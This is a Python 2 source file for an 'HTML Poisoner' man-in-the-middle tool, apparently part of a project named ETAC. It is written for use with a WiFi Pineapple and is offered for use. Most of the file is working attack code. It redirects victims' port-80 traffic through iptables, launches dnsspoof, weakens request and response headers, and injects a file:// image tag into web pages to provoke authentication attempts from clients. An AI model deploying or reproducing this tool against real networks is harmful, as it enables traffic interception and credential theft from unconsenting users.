#!/usr/bin/env python
# This file is part of ETAC
# ETAC work by Felix Ryan
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

HOST = "0.0.0.0"
PORT = 3128
VERBOSE = True
TESTING = True
VERBOSETESTING = False
MAX_CONN = 50
BUFFER_SIZE = 4096
SOCKET_TIMEOUT = 2

TESTING_FILE_RxRequest = 'HTMLpoisoner.RXreq.raw'
TESTING_FILE_RxResponse = 'HTMLpoisoner.RXres.raw'
TESTING_FILE_TxRequest = 'HTMLpoisoner.TXreq.raw'
TESTING_FILE_TxResponse = 'HTMLpoisoner.TXres.raw'

from thread import *
from utils import *
from datetime import datetime

def closeTxAndRx(RxConnection, TxConnection, RxConnNum):
    TxConnection.close()
    if TESTING:
        printMsg(RxConnNum, 'TxConnection closed')
    RxConnection.close()
    if TESTING:
        printMsg(RxConnNum, 'RxConnection closed')


# handle inbound connections in new thread
def connectionHandler(RxConnection, RxRequest, RxConnNum):
    RxHeaders = getRxReqHeaders(RxRequest, RxConnNum)
    # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
    if RxHeaders == False:
        sendBanner(RxConnection, RxConnNum)
    else:
        TxConnectionString = getConnectionString(RxHeaders, RxConnNum)
        if TxConnectionString != False:

            # make URI formatted for error handling
            if '?' in TxConnectionString['URI']:
                TxFileRequested = TxConnectionString['URI'].split('?')[0][-20:]
            else:
                TxFileRequested = TxConnectionString['URI'][-20:]

            TxRequest = weakenRxRequest(RxRequest, RxConnNum, TxConnectionString['transport'] + '://' + TxConnectionString['host'] + ':' + str(TxConnectionString['port']) + ' + last chars of file ' + TxFileRequested)

            # Connect to real web server
            TxConnection = createTxConnection(TxConnectionString, RxConnNum)
            # Send data to real web server if connection to server was possible
            if TxConnection != False:
                if sendData(TxConnection, TxRequest, 'TxRequest', RxConnNum) == False:
                    return
                # hand over processing to the correct function
                receiveTxResponse(TxConnection, RxConnection, RxConnNum)
            elif TESTING:
                printMsg(RxConnNum, 'No TxSocket to work with')
        else:
            # if we haven't been able to establish a valid connection string, don't do anything else
            if TESTING:
                printMsg(RxConnNum, 'Incomplete connection string: ' + str(TxConnectionString))
            RxConnection.close()
            if VERBOSE:
                printMsg(RxConnNum, 'RXConnection Closed')


# create a listening socket to receive victim requests
def createRxSocket(host, port):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # attempt to avoid socket lock problems
        if VERBOSE:
            print 'Socket build complete (' + host + ':' + str(port) + ')'
    except socket.error as errMsg:
        print color('[!] Failed to build socket') + '(' + host + ':' + str(port) + ')\n' + str(errMsg)
        sys.exit(2)
    try:
        ServerSocket.bind((host, port))
        ServerSocket.listen(MAX_CONN)
        if VERBOSE:
            print 'Socket bind complete (' + host + ':' + str(port) + ')'
    except socket.error as errMsg:
        print color('[!] Failed to bind socket') + '(' + host + ':' + str(port) + ')\n' + str(errMsg)
        sys.exit(2)
    return ServerSocket


# connect to the legitmate server
def createTxConnection(connectionString, RxConnNum):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.settimeout(SOCKET_TIMEOUT)
        if VERBOSETESTING:
            printMsg(RxConnNum, 'TxSocket build complete (' + connectionString['host'] + ":" + str(connectionString['port']) + ')')
        ServerSocket.connect((connectionString['host'], int(connectionString['port'])))
        if VERBOSETESTING:
            printMsg(RxConnNum, 'TxSocket connection complete (' + connectionString['host'] + ":" + str(connectionString['port']) + ')')
        return ServerSocket
    except socket.error as errMsg:
        # xxx colour below
        print color('RxC=' + str(RxConnNum) + ':::[!] Failed to connect to server') + '(' + connectionString['transport'] + '://' + connectionString[
            'host'] + ":" + str(connectionString['port']) + "/" + connectionString['URI'] + ")\n" + str(
            errMsg)
        return False


# work out a connection string
def getConnectionString(RxHeaders, RxConnNum):
    # Example HeaderOne value:
    # GET http://www.google.com:8080/path/to/resource/index.php?q=example HTTP/1.1
    # the below splits the above into its component parts and creates a dictionary
    # from example should result in: "GET"
    if RxHeaders['Req'] != '':
        try:
            # from example should result in: "GET"
            method = RxHeaders['Req'].split(' ')[0]
            # from example should result in: "HTTP/1.1"
            dialect = RxHeaders['Req'].split(' ')[2]
            if VERBOSETESTING:
                printMsg(RxConnNum, 'Method: ' + method)
            # use of a transparent proxy won't necessarily include the host in the request header, test for this here:
            if '://' in RxHeaders['Req'].split(' ')[1]:
                # from example should result in: "http"
                transport = RxHeaders['Req'].split(' ')[1].split('://')[0]
                if VERBOSETESTING:
                    printMsg(RxConnNum, 'Transport: ' + transport)
                # from example should result in: "www.google.com:8080"
                hostAndPort = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/')[0]
                if VERBOSETESTING:
                    printMsg(RxConnNum, 'Host and Port: ' + hostAndPort)
                try:
                    # from example should result in: "8080" (do this first to trigger the except earlier)
                    port = hostAndPort.split(':')[1]
                    if VERBOSETESTING:
                        printMsg(RxConnNum, 'Port: ' + str(port))
                    # from example should result in: "www.google.com"
                    host = hostAndPort.split(':')[0]
                    if VERBOSETESTING:
                        printMsg(RxConnNum, 'Host: ' + host)
                except IndexError:
                    # from example should result in: "www.google.com"
                    host = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[0]
                    if VERBOSETESTING:
                        printMsg(RxConnNum, 'Host: ' + host)
                    port = 80
                    if VERBOSETESTING:
                        printMsg(RxConnNum, 'Port: ' + str(port))
                URI = '/' + RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[1]
                if VERBOSETESTING:
                    printMsg(RxConnNum, 'URI: ' + URI)
            else:
                # if this is triggered it means transparent proxy so have to make assumptions for below values
                transport = 'http'
                host = RxHeaders['Host']
                port = 80
                URI = RxHeaders['Req'].split(' ')[1]
                if VERBOSETESTING:
                    printMsg(RxConnNum, 'Transport: ' + transport)
                    printMsg(RxConnNum, 'Host: ' + host)
                    printMsg(RxConnNum, 'Port: ' + str(port))
                    printMsg(RxConnNum, 'URI: ' + URI)

        except IndexError as ErrMsg:
            printMsg(RxConnNum, 'RxHeaders issue detected: ' + str(ErrMsg) + "\n" + RxHeaders['Req'])
            return False
        connString = {'method': method, 'transport': transport, 'host': host, 'port': port, 'URI': URI, 'dialect': dialect}
        return connString
    else:
        printMsg(RxConnNum, 'Blank RxHeader["Req"] detected')
    return False


# extract the Rx Request headers
def getRxReqHeaders(RxRequest, RxConnNum):
    # Split out the data section from the headers / preamble
    HTTPData = RxRequest.split("\r\n\r\n", 1)
    # Split each line
    HTTPHeadersList = HTTPData[0].split("\r\n")
    try:
        # First line is the HTTP method and request
        HTTPHeadersDict = {'Req': HTTPHeadersList[0]}
        # The rest are colon separated headers and can be turned into a dictionary
        headerIndex = 0
        for header in HTTPHeadersList:
            if headerIndex > 0:
                headerParts = header.split(":", 1)
                HTTPHeadersDict[headerParts[0]] = str(headerParts[1]).replace(' ', '')
            headerIndex += 1
        if VERBOSETESTING:
            printMsg(RxConnNum, 'Headers: '+str(HTTPHeadersDict))
        return HTTPHeadersDict
    except IndexError:
        return False


# extract the size of the content of the supplied data, excludes HTTP headers
def getTxResChunkSize(TxResponseChunk, TCPchunkID):
    if TCPchunkID == 1:
        return len(TxResponseChunk.split("\r\n\r\n", 1)[1])
    else:
        return len(TxResponseChunk)


# extract what content type it is, we are looking for text/html
def getTxResContentType(TxResHeaders, RxConnNum):
    if 'Content-Type:' in TxResHeaders:
        headersList = TxResHeaders.split("\r\n")
        for header in headersList:
            if 'Content-Type:' in header:
                contentType = header.split(": ", 1)[1]
                break
        if TESTING:
            printMsg(RxConnNum, 'Content type is ' + contentType)
        return contentType
    else:
        printMsg(RxConnNum, 'No content type detected')
        return 'Undetectable content type'


# extract the continue vs end status of the TxRes transmission
def getTxResEndStatus(TxResChunk, TxResReportedSize, TxResReceivedSize, TxConnection, RxConnection, RxConnNum):
    if TxResReportedSize != False:
        if (TxResReportedSize <= TxResReceivedSize):
            if TESTING:
                printMsg(RxConnNum, 'Received content size greater than content size header')
            return True

    if ('\r\n0\r\n\r\n' in TxResChunk):
        if TESTING:
            printMsg(RxConnNum, 'CTE content end marker detected')
        return True

    if len(TxResChunk) == 0:
        if TESTING:
            printMsg(RxConnNum, 'Received zero sized chunk')
        return True


# extract the Tx Response headers
def getTxResHeaders(TxResponseChunk):
    return TxResponseChunk.split("\r\n\r\n", 1)[0] + "\r\n\r\n"


# extract how long the response is, not including the headers
def getTxResReportedContentLength(TxResponseHeaders, RxConnNum):
    if 'Content-Length:' in TxResponseHeaders:
        headersList = TxResponseHeaders.split("\r\n")
        for header in headersList:
            if 'Content-Length:' in header:
                contentLength = header.split(": ", 1)[1]
                break
        if VERBOSETESTING:
            printMsg(RxConnNum, 'Content length is ' + contentLength)
        return contentLength
    else:
        printMsg(RxConnNum, 'No content length detected')
        return False


# extract the HTTP transfer type, i.e. Chunked Transfer Encoding or not
def getTxResTransferType(TxResponseHeaders, RxConnNum):
    if 'Transfer-Encoding: chunked' in TxResponseHeaders:
        if TESTING:
            printMsg(RxConnNum, 'CTE detected')
        return 'CTE'
    elif ('Content-Length:' not in TxResponseHeaders) and ('HTTP/1.1' in TxResponseHeaders):
            if TESTING:
                printMsg(RxConnNum, 'CTE detected')
            return 'Unmarked CTE'
    elif 'Content-Length:' in TxResponseHeaders:
        if TESTING:
            printMsg(RxConnNum, 'Non-CTE detected')
        return 'Non-CTE'
    else:
        printMsg(RxConnNum, 'Chunking detection error detected')
        return None


# deal with old log files that are left over
def logCleanup():
    # delete files if already exist
    for file in os.listdir('logs'):
        if re.search(TESTING_FILE_RxRequest+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)
        if re.search(TESTING_FILE_RxResponse+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)
        if re.search(TESTING_FILE_TxRequest+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)
        if re.search(TESTING_FILE_TxResponse+'[0-9]*', file):
            try:
                os.remove('logs/' + file)
            except OSError as errMsg:
                print 'Can\'t delete file: ' + str(errMsg)


# get the thing up and running
def main():
    # make sure no previous TESTING raw file captures are present
    logCleanup()
    # create the lsitening socket for the transparent proxy
    RxSocket = createRxSocket(HOST, PORT)
    # once the receiving socket is setup, change the IPTABLES rules to redirect port 80 to the transparent proxy
    os.system('iptables -A PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
    # detect if DNSSpoof is already running
    if os.system('ps aux | grep dnsspoof | grep -v grep | awk {\'print $1\'}') == False:
        print 'Starting DNSSpoof'
        # if not, start the DNSSpoof daemon
        os.system('dnsspoof -i br-lan -f /etc/pineapple/spoofhost > /dev/null &')
        # the above dies when ETAC kills the thread that spawned it, so no need to manually terminate
    else:
        print 'DNSSpoof already started'
    # to aid bug hunting, track each connection, initialise the first value
    RxConnNum = 0

    # always try and keep a socket listening
    while True:
        # allow connections to be made to the Rx socket
        RxConnection, RxAddress = RxSocket.accept()
        # print connection details to screen to show activity
        if TESTING:
            printMsg(RxConnNum, 'Connection from: ' + RxAddress[0] + ":" + str(RxAddress[1]))
        # receive data from the RxSocket
        RxRequest = receiveRxReq(RxConnection, RxConnNum)
        # if an error is detected on RxConnection, don't process any further
        if RxRequest != False:
            # when new connections are received, spawn a new thread to handle it
            start_new_thread(connectionHandler, (RxConnection, RxRequest, RxConnNum))
            # increment connection counter (for bug hunting)
            RxConnNum += 1


# calculate and insert new content length
def manipulateContentLength(RxResponse):
    # Recalculate the size of the request as close as possible
    RxResponseNewLength = len(str(RxResponse.split("\r\n\r\n",1)[1]))
    # Insert new length into existing "Content-Length" header RxResponse
    if 'Content-Length:' in RxResponse:
        RxResponse = re.sub(r'\r\nContent-Length:.*\r\n', '\r\nContent-Length: ' + str(RxResponseNewLength) + '\r\n',RxResponse)
    else: # Insert new "Content-Length" header as previously didn't exist
        RxResponseNewLength = RxResponseNewLength + 16
        RxResponse = re.sub(r'\r\n\r\n', '\r\nContent-Length: ' + str(RxResponseNewLength) + '\r\n\r\n',RxResponse, 1)
    return RxResponse


# inject the attack HTML tag
def poisonRxResponse(TxResponse, RxConnNum):
    IntermediateResponse = TxResponse
    # inject new tag if lowercase "<body>" tag is found
    if '</body>' in IntermediateResponse:
        IntermediateResponse = IntermediateResponse.replace('</body>','<img src="file://htmlinject/share/random.jpg" alt="" /></body>')
    # inject new tag if uppercase "<body>" tag is found
    if '</BODY>' in IntermediateResponse:
        IntermediateResponse = IntermediateResponse.replace('</BODY>','<IMG SRC="file://htmlinject/share/random.jpg" ALT="" /></BODY>')

    RxResponse = IntermediateResponse

    if 'file://htmlinject/share/random.jpg' in RxResponse:
        if VERBOSE:
            # xxx print colour
            print color('RxC=' + str(RxConnNum) + ':::[*] HTML poisoning performed',4)
    return RxResponse


# output command line message
def printMsg(RxConnNum, msg):
    print 'RxC=' + str(RxConnNum) + ':::' + str(datetime.now()) + ':::' + str(msg)


# reveive the Rx Request and make sure no networking errors
def receiveRxReq(connection, RxConnNum):
    wholeRxReqData = ''
    # effectively this is a "while True", however, build in a hard limit to help ensure no process hangs:
    loopIndex = 0
    while loopIndex < 500:
        loopIndex += 1
        if loopIndex == 499:
            printMsg(RxConnNum, 'Maximum RxReq loop detected')
        try:
            data = connection.recv(BUFFER_SIZE)
            if TESTING:
                printMsg(RxConnNum, 'Client sent ' + str(len(data)) + ' bytes')
            # for testing purposes, dump data to disk
            if TESTING:
                writeRawData(data, TESTING_FILE_RxRequest, RxConnNum, True)

            wholeRxReqData = wholeRxReqData + data

            if "\r\n\r\n" in data:
                break
            elif len(data) == 0:
                break

        except socket.timeout as errMsg:
            if str(errMsg) == 'timed out':
                if VERBOSE:
                    printMsg(RxConnNum, 'RxReqConnection timed out')
                break
            else:
                printMsg(RxConnNum, 'RxReqConnection closed before expected: ' + str(errMsg))
                break

        except socket.error as errMsg:
            printMsg(RxConnNum, 'RxReqConnection socket error detected: ' + str(errMsg))
            return False

    return str(wholeRxReqData)


# overall handler for the Tx Responses, dishes out to sub handlers based on types
def receiveTxResponse(TxConnection, RxConnection, RxConnNum):
    TCPchunkID = 0 # keep an index of which TCP chunk we are working with
    TxResTransferType = None # CTE = Chunked Transport Encoding
    TxResReceivedSize = 0
    TxResContentType = 'Content type not inspected'
    TxResReportedSize = False
    NotifyUserTxResReceived = True
    NotifyUserRxResSent = True
    TxFullResponse = '' # initialise variable
    CTEchunkLeftovers = '' # initialise so that it always has a value for short CTE responses


    #effectively this is a "while True", however, build in a hard limit to help ensure no process or thread hangs
    while TCPchunkID < 500:
        if TCPchunkID == 499:
            printMsg(RxConnNum, 'Maximum TxRes loop detected')
            break
        # get TxResponse
        try:
            TCPchunkID += 1
            TxResChunk = TxConnection.recv(BUFFER_SIZE)
            if TESTING:
                writeRawData(TxResChunk, TESTING_FILE_TxResponse, RxConnNum, True)
            if TESTING and NotifyUserTxResReceived:
                NotifyUserTxResReceived = False
                printMsg(RxConnNum, 'TxRes received, chunkID = ' + str(TCPchunkID))
        # socket error handling below here
        except socket.timeout as errMsg:
            if str(errMsg) == 'timed out':
                if VERBOSE:
                    printMsg(RxConnNum, 'TxConnection timed out')
                TxConnection.close()
                if TESTING:
                    printMsg(RxConnNum, 'TxConnection closed')
                RxConnection.close()
                if TESTING:
                    printMsg(RxConnNum, 'RxConnection closed')
                break
            else:
                printMsg(RxConnNum, 'TxConnection closed before expected: ' + str(errMsg))
                TxConnection.close()
                if TESTING:
                    printMsg(RxConnNum, 'TxConnection closed')
                RxConnection.close()
                if TESTING:
                    printMsg(RxConnNum, 'RxConnection closed')
                break
        except socket.error as errMsg:
            printMsg(RxConnNum, 'TxConnection socket error detected: ' + str(errMsg))
            TxConnection.close()
            if TESTING:
                printMsg(RxConnNum, 'TxConnection closed')
            RxConnection.close()
            if TESTING:
                printMsg(RxConnNum, 'RxConnection closed')
            break

        # if this is the first iteration, extract some details
        if TCPchunkID == 1:
            TxResHeaders = getTxResHeaders(TxResChunk)
            TxResTransferType = getTxResTransferType(TxResHeaders, RxConnNum)
            TxResReportedSize = getTxResReportedContentLength(TxResHeaders, RxConnNum)
            TxResContentType = getTxResContentType(TxResHeaders, RxConnNum)

        # hand over processing to sub handler
        if 'text/html' in TxResContentType:
            if TxResTransferType == 'CTE':
                CTEchunkLeftovers = TxResCTEHandler(TxResChunk, CTEchunkLeftovers, RxConnection, TCPchunkID, NotifyUserRxResSent, RxConnNum)
                if CTEchunkLeftovers == False:
                    break
                NotifyUserRxResSent = False
            elif TxResTransferType == 'Non-CTE':
                TxFullResponse = TxResNonCTEHandler(TxFullResponse, TxResChunk, TxResReportedSize, RxConnNum)
            elif TxResTransferType == 'Unmarked CTE':
                if not TxResUnmarkedCTEHandler(TxResChunk, RxConnection, TCPchunkID, NotifyUserRxResSent, RxConnNum):
                    break
                NotifyUserRxResSent = False
            else: # unknown transfer type
                printMsg(RxConnNum, 'Unknown transfer type for text/html content type, sending to storeAndForward')
                if not storeAndForward(TxResChunk, RxConnection, TCPchunkID, NotifyUserRxResSent, RxConnNum):
                    break
                NotifyUserRxResSent = False
        else: # hand over to storeAndForward as no idea what it is
            if not storeAndForward(TxResChunk, RxConnection, TCPchunkID, NotifyUserRxResSent, RxConnNum):
                break
            NotifyUserRxResSent = False

        # cumulatively increase content size marker
        TxResReceivedSize += getTxResChunkSize(TxResChunk, TCPchunkID)
        # detect if end of TxRes, if so, close connections as no further transfer is requried
        if getTxResEndStatus(TxResChunk, TxResReportedSize, TxResReceivedSize, TxConnection, RxConnection, RxConnNum):
            break

    # non-CTE content must be sent once poisoned which can only be done once complete, i.e. outside of above loop
    if TxResTransferType == 'Non-CTE' and 'text/html' in TxResContentType:
        # weaken the RxResponse headers
        IntermediateResponse = weakenRxResponse(TxFullResponse, RxConnNum)
        # poison the RxResponse body
        IntermediateResponse = poisonRxResponse(IntermediateResponse, RxConnNum)
        # update the Content-Length header to reflect any changes
        RxResponse = manipulateContentLength(IntermediateResponse)
        if TESTING:
            writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnNum)
        # finally send the whole thing to the victim
        sendData(RxConnection, RxResponse, 'Non-CTE - RxResponse', RxConnNum)

    closeTxAndRx(RxConnection, TxConnection, RxConnNum)

# when not a HTTP connection send banner back to user
def sendBanner(connection, RxConnNum):
    connection.send('The HTML Poisoner at your service ma\'am...')
    if TESTING:
        # xxx print colour
        print color('RxC=' + str(RxConnNum) + ':::[!]Irrelevant connection detected: service banner sent')


# send data, check for errors
def sendData(connection, dataToSend, dataType, RxConnNum, NotifyUser = False):
    try:
        connection.send(dataToSend)
        if TESTING and NotifyUser == True:
            printMsg(RxConnNum, dataType + ' sent')
        return True
    except socket.error as errMsg:
        if NotifyUser == True:
            printMsg(RxConnNum, dataType + ' socket error: ' + str(errMsg))
        return False

# sub-handler for when no maleable Tx response is detected
def storeAndForward(TxResChunk, RxConnection, TCPchunkID, NotifiedUserRxResSent, RxConnNum):
    if TCPchunkID == 1:
        RxResChunk = weakenRxResponse(TxResChunk, RxConnNum)
    else:
        RxResChunk = TxResChunk
    if TESTING:
        writeRawData(RxResChunk, TESTING_FILE_RxResponse, RxConnNum, True)
    if sendData(RxConnection, TxResChunk, 'storeAndForward', RxConnNum, NotifiedUserRxResSent):
        return True
    else:
        return False


# sub-handler for Non-CTE Tx Responses
def TxResNonCTEHandler(TxFullResponse, TxResChunk, TxResReportedSize, RxConnNum):
    TxFullResponse += TxResChunk
    if TESTING:
        printMsg(RxConnNum, 'Received Content Length = ' + str(len(TxFullResponse)) + ' / Reported Content Length = ' + str(TxResReportedSize))
    return TxFullResponse


# sub-handler for CTE Tx Responses
def TxResCTEHandler(TxResChunk, CTEchunkLeftovers, RxConnection, TCPchunkID, NotifiedUserRxResSent, RxConnNum):
    if TCPchunkID == 1:
        # store the content until next loop, but ignore the headers as they are dealt with here
        CTEchunkLeftovers = "\r\n" + TxResChunk.split("\r\n\r\n", 1)[1]

        # extract the RxResponse headers and then send for weakening
        TxResHeaders = weakenRxResponse(getTxResHeaders(TxResChunk), RxConnNum)

        # write the current manipulated chunk to disk
        if TESTING:
            writeRawData(TxResHeaders, TESTING_FILE_RxResponse, RxConnNum, True)

        # transmit the headers, discard them, break the loop in order to move onto the content
        if sendData(RxConnection, TxResHeaders, 'CTE - RxResponse (HTML, TCPchunkID=1)', RxConnNum, True):
            return CTEchunkLeftovers
        else:
            return False
    else:
        # prepend previously received and unused CTE data chunk(s) to the currently received one
        TxResChunk = CTEchunkLeftovers + TxResChunk

        if VERBOSETESTING:
            printMsg(RxConnNum, 'CTE - Raw chunk marker: 0x' + str(TxResChunk.split("\r\n", 2)[1]))

        # select the chunk size marker
        CTEreportedChunkLengthHexTx = TxResChunk.split("\r\n", 2)[1]
        CTEreportedChunkLengthTx = int(CTEreportedChunkLengthHexTx, 16)
        if VERBOSETESTING:
            printMsg(RxConnNum, 'CTE - chunk marker = ' + str(CTEreportedChunkLengthTx) + ', received ' + str(
                len(TxResChunk.split("\r\n", 1)[1])))

        # work out how much data has been received
        CTEchunkReceived = len(TxResChunk.split("\r\n", 2)[2])
        # check if the data is larger than the CTE chunk we were expecting
        if int(CTEchunkReceived) > int(CTEreportedChunkLengthTx):
            if VERBOSETESTING:
                printMsg(RxConnNum, 'CTE - Got a whole chunk')

            # isolate the data that is destined for the next CTE chunk
            CTEchunkLeftovers = TxResChunk.split("\r\n", 2)[2][CTEreportedChunkLengthTx:]
            # isolate the current CTE data chunk (minus the chunk marker)
            TxResChunk = TxResChunk.split("\r\n", 2)[2][:CTEreportedChunkLengthTx]
            # try to poison it
            TxResChunk = poisonRxResponse(TxResChunk, RxConnNum)

            # add a CTE chunk size header to the current CTE chunk
            CTEnewChunkLengthRx = len(TxResChunk)
            CTEnewChunkLengthHexRx = hex(CTEnewChunkLengthRx)[2:]
            TxResChunk = str(CTEnewChunkLengthHexRx) + "\r\n" + TxResChunk

            # write the current manipulated chunk to disk
            if TESTING:
                writeRawData(TxResChunk, TESTING_FILE_RxResponse, RxConnNum, True)

            # finally send the chunk to the victim
            if sendData(RxConnection, TxResChunk, 'TxResCTEHandler', RxConnNum, NotifiedUserRxResSent):
                return CTEchunkLeftovers
            else:
                return False


# sub-handler for when no maleable Tx response is detected
def TxResUnmarkedCTEHandler(TxResChunk, RxConnection, TCPchunkID, NotifiedUserRxResSent, RxConnNum):
    if TCPchunkID == 1:
        RxResChunk = weakenRxResponse(TxResChunk, RxConnNum)
    else:
        RxResChunk = poisonRxResponse(TxResChunk,RxConnNum)
    if TESTING:
        writeRawData(RxResChunk, TESTING_FILE_RxResponse, RxConnNum, True)
    if sendData(RxConnection, RxResChunk, 'TxResUnmarkedCTEHandler', RxConnNum, NotifiedUserRxResSent):
        return True
    else:
        return False


# alter Rx Request headers to help elicit a weak response
def weakenRxRequest(RxRequest, RxConnNum, URL):
    # just here for clarity of data flow
    IntermediateRequest = RxRequest

    # Make sure the web server knows that encoding would cause us trouble by telling it that we don't want any
    IntermediateRequest = re.sub(r'\r\nAccept-Encoding:.*\r\n', '\r\nAccept-Encoding: none\r\n', IntermediateRequest, 1)
    # we want a fresh response every time, so don't bother checking if the file has been modified
    IntermediateRequest = re.sub(r'\r\nIf-Modified-Since:.*\r\n', '\r\n', IntermediateRequest, 1)
    # we still want a fresh response every time, so don't check if you have the response to previous request
    IntermediateRequest = re.sub(r'\r\nIf-None-Match:.*\r\n', '\r\n', IntermediateRequest, 1)
    # prevent persistant connections as they add a huge amount of headache to the logic of this attack
    IntermediateRequest = re.sub(r'\r\nConnection:.*\r\n', '\r\nConnection: close\r\n', IntermediateRequest, 1)

    # just here for clarity of data flow
    TxRequest = IntermediateRequest

    if VERBOSE and ('Accept-Encoding: none' in TxRequest or 'Accept-Encoding:' not in TxRequest) and 'If-Modified-Since:' not in TxRequest and 'If-None-Match:' not in TxRequest:
        # xxx print colour
        if 'Accept-Encoding:' not in TxRequest:
            printMsg(RxConnNum,'[*] No weakening required')
        else:
            print color('RxC=' + str(RxConnNum) + ':::[*] Client request weakened (' + URL + ')',3)
    elif VERBOSE:
        print color('RxC=' + str(RxConnNum) + ':::[!] Client request NOT fully weakened (' + URL + ')')
    if VERBOSETESTING:
        print 'RxC=' + str(RxConnNum) + ':::TxReq: '+TxRequest
    if TESTING:
        writeRawData(TxRequest, TESTING_FILE_TxRequest, RxConnNum)
    return TxRequest


# Inject HTML tag into response to elicit resource request (and therefore auth attempt) from client
def weakenRxResponse(TxResponse, RxConnNum):
    # set up intermediate variable so multiple weakenings can be completed
    IntermediateResponse = TxResponse
    # Extract the headers from the TxResponse, first split out the data section from the headers / preamble
    TxData = TxResponse.split("\r\n\r\n", 1)
    # Split each line
    headersList = TxData[0].split("\r\n")

    for header in headersList:
        # Ranges cause problems when the MitM changes the content length - so disable them
        if 'Accept-Ranges:' in str(header):
            IntermediateResponse = re.sub(r'\r\nAccept-Ranges:.*\r\n', '\r\nAccept-Ranges: none\r\n', IntermediateResponse, 1)

        if 'Connection:' in str(header):
            IntermediateResponse = re.sub(r'\r\nConnection:.*\r\n', '\r\nConnection: close\r\n', IntermediateResponse, 1)

        if 'Cache-Control:' in str(header):
            IntermediateResponse = re.sub(r'\r\nCache-Control:.*\r\n', '\r\nCache-Control: no-cache, no-store, must-revalidate\r\n', IntermediateResponse, 1)

    RxResponse = IntermediateResponse

    if TESTING:
        printMsg(RxConnNum, 'RxResponse sent for weakening')
    return RxResponse


# write data to disk - for testing purposes
def writeRawData(data, filename, RxConnNum, append=False):
    if VERBOSETESTING:
        printMsg(RxConnNum, 'Attempting to write raw data to disk (' + filename + ') for testing purposes')
    if append:
        outputFile = open('logs/' + filename + str(RxConnNum), "a")
    else:
        outputFile = open('logs/'+filename+str(RxConnNum), "w")
    outputFile.write('\r\n\r\n(RxConn=' + str(RxConnNum) + ')\r\n' + data)
    outputFile.close()


if __name__ == '__main__':
    try:
        main()
    # attempt, though don't hold your breath, to shutdown gracefully when told to do so
    except KeyboardInterrupt:
        print 'User signaled exit...'
        os.system('iptables -D PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
